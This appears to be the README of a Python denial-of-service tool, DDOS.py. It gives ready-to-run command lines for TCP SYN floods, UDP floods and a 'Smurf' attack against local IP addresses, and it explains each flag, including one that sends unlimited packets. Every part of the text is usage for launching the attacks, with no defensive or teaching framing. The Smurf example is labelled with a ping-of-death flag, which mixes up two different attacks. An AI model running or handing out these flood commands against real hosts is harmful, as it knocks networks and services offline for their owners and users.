# Syntax to Execute the DDOS Script

Example 1 : Execute  a TCP SYN attack
      
      python DDOS.py -toa tcp -fl syn -c X -d 192.168.1.9
      
      -toa : Type of attack you want to perform (TCP,UDP,etc.)
      -fl  : What kind of attack in the above mentioned type (Syn flood, Reset flood , Ack flood, etc.)
      -c   : How many number of packets you want to push on the network while executing this script('X' denotes infinte number of packets)
      -d   : Destination network IP address
      
Example 2 : Execute UDP flood attack. Push 10 packets to destination.

      python DDOS.py -toa udpflood -c 10 -d 192.168.1.9
   
Example 3 : Execute a Smurf attack

      python DDOS.py -toa ping -fl pod -c X -d 192.168.1.15

In my case 192.168.1.15 is the broadcast address.


For help : python DDOS.py --help
